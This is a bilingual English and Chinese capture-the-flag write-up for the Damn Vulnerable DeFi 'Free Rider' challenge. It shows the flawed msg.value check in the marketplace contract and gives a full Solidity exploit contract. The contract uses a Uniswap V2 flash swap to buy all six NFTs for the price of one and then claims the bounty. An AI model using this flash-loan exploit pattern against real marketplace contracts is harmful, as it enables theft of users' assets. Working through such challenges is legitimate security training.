# Free Rider

A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

A critical vulnerability has been reported, claiming that all tokens can be taken. Yet the developers don't know how to save them!

They’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way. The recovery process is managed by a dedicated smart contract.

You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.

If only you could get free ETH, at least for an instant.

一个新的市场该死的宝贵的nft已经发布！最初有6个nft，可以在市场上出售。每个15 ETH。

报告了一个严重的漏洞，声称所有token都可以被拿走。然而开发者却不知道如何拯救它们！

他们悬赏45 ETH给任何愿意除掉nft的人。恢复过程由专用智能合约管理。

你已经同意帮忙了。虽然，你只有0.1 ETH的余额。开发者不会回复你要求更多信息的信息。

如果你能得到免费的ETH就好了，至少有那么一瞬间。 ==>这里的意思应该

# 漏洞代码
market中的_buyOne函数
```solidity
//@audit-issue 用全局的msg.value和单个NFT的价格对比，而非累计已支付金额
        if (msg.value < priceToPay) {
            revert InsufficientPayment();
        }
```
由于每个NFT都是15ETH，且合约中已经有90个ETH。所以我们只需要传入15个ETH就能取走所有的NFT。

# 攻击代码
```solidity
interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract AttackFreeRider {
    IUniswapV2Pair public pair;
    IMarketplace public marketplace;

    IWETH public weth;
    IERC721 public nft;

    address public recoveryContract;
    address public player;

    uint256 private constant NFT_PRICE = 15 ether;
    uint256[] private tokens = [0, 1, 2, 3, 4, 5];

    constructor(address _pair, address _marketplace, address _weth, address _nft, address _recoveryContract) payable {
        pair = IUniswapV2Pair(_pair);
        marketplace = IMarketplace(_marketplace);
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        recoveryContract = _recoveryContract;
        player = msg.sender;
    }

    function start() external payable {
         // 1. Request a flashSwap of 15 WETH from Uniswap Pair
         // 利用uniswapV2的闪电贷获取15ETH
        pair.swap(NFT_PRICE, 0, address(this), "1");
    }

    //自动执行攻击代码
    function uniswapV2Call(address /*sender*/, uint /*amount0*/, uint /*amount1*/, bytes calldata /*data*/) external {

        // Access Control
        require(msg.sender == address(pair));
        require(tx.origin == player);

        // 2. Unwrap WETH to native ETH
        weth.withdraw(NFT_PRICE);

        // 3. Buy 6 NFTS for only 15 ETH total
        marketplace.buyMany{ value: NFT_PRICE }(tokens);

        // 4. Send NFTs to recovery contract so we can get the bounty
        bytes memory data = abi.encode(player);
        for(uint256 i; i < tokens.length; i++){
            nft.safeTransferFrom(address(this), recoveryContract, i, data);
        }

        // 5. Pay back 15WETH + 0.3% to the pair contract
        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
        weth.deposit{value: amountToPayBack}();
        weth.transfer(address(pair), amountToPayBack);
        
    }

    // To make sure safeTransferFrom won't revert
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    // To receive the ETH once we unwrap WETH to ETH also when we get the bounty (as native eth)
    receive() external payable {}
}
```